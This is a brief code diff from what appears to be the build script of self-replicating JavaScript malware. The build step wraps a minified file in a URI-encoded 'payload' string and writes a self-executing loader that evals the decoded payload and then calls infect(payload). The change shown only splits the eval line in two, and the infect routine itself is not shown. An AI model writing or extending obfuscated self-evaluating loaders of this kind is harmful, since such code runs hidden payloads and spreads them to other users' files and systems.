@@ -17,7 +17,8 @@ async function build() {
     var raw = await fs.readFile( minified, "utf-8" );
     await fs.writeFile( tgt, `(function() {
         var payload = "${encodeURI(raw)}";
-        eval( decodeURI(payload) );
+        var decoded = decodeURI(payload);
+        eval(decoded);
         infect(payload);
     })();` );
 }
